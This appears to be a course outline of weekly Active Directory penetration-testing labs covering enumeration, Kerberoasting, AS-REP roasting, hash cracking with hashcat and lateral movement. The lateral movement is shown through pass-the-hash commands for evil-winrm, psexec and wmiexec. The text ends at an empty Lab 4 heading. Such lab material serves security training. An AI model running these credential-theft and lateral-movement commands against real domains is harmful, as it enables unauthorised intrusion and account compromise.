# 4. Weekly Labs

### **Lab 1 — AD Recon & Domain Enumeration**

**Time:** 2 hours  
**Workbook:** AD Lab → Recon + Enum

Commands:

```bash
nmap -p 88,135,139,389,445,636,3268,3269 <DC-IP>
crackmapexec smb <DC-IP>
rpcclient -U "" <DC-IP>
```

Tools:

- `nmap`
- `rpcclient`
- `ldapsearch`
- `crackmapexec`
- `bloodhound-python`

---

### **Lab 2 — Credential Attacks (Kerberoasting + AS‑REP Roasting)**

**Time:** 3 hours  
**Workbook:** AD Lab → Credential Attacks

Kerberoasting:

```bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC-IP> -request
```

AS‑REP Roasting:

```bash
impacket-GetNPUsers domain.local/ -dc-ip <DC-IP> -usersfile users.txt
```

Crack hashes:

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

---

### **Lab 3 — Lateral Movement**

**Time:** 3 hours  
**Workbook:** AD Lab → Lateral Movement

Techniques:

- WinRM
- SMB exec
- WMI exec
- Pass‑the‑Hash
- Pass‑the‑Ticket
- Overpass‑the‑Hash

Examples:

```bash
evil-winrm -i <IP> -u <user> -H <hash>
psexec.py domain.local/user@<IP>
wmiexec.py domain.local/user@<IP>
```

### **Lab 4 — Privilege Escalation → Domain Admin**
